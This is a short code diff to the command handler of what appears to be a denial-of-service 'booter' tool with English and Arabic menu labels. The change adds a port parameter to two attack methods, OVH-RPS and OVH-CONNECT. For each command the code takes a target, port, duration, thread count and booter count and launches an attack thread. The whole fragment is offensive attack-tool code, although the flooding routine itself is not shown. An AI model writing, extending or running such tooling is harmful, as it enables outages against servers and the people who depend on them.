@@ -59,21 +59,23 @@ def controler():
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['HANDSHAKE']))
         elif a =='OVH-RPS' or a == 'أوفه-آربيس' or a == 'OVHRPS':
-           if len(com) == 5:
+           if len(com) == 6:
             target = com[1]
-            times = com[2]
-            thread = com[3]
-            booters = com[4]
-            threading.Thread(target=type_sender,args=('OVH-RPS',f'{target} {times} {thread} {booters}')).start()
+            port = com[2]
+            times = com[3]
+            thread = com[4]
+            booters = com[5]
+            threading.Thread(target=type_sender,args=('OVH-RPS',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHRPS']))
         elif a =='OVH-CONNECT' or a == 'OVH-الاتصال' or a == 'OVHCONNECT':
-           if len(com) == 5:
+           if len(com) == 6:
             target = com[1]
-            times = com[2]
-            thread = com[3]
-            booters = com[4]
-            threading.Thread(target=type_sender,args=('OVH-CONNECT',f'{target} {times} {thread} {booters}')).start()
+            port = com[2]
+            times = com[3]
+            thread = com[4]
+            booters = com[5]
+            threading.Thread(target=type_sender,args=('OVH-CONNECT',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHCONNECT']))
         elif a == 'MENU':
